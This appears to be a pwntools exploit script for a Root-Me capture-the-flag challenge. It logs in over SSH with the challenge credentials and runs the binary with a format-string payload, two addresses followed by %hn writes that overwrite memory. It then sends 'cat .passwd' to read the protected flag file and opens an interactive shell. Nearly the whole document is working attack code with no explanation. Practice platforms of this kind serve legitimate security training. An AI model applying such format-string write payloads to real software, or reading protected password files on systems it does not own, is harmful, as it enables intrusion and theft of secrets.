from pwn import*

s = ssh(host='challenge02.root-me.org' ,user='app-systeme-ch14' ,password='app-systeme-ch14',port=2222)
p = s.process(['./ch14', b'\xb8\xfb\xff\xbf\xba\xfb\xff\xbf%48871x%9$hn%8126x%10$hn'])
#gdb.attach(p, api=True)

#payload = 
#p.sendline(payload)

p.sendline('cat .passwd')
p.interactive()
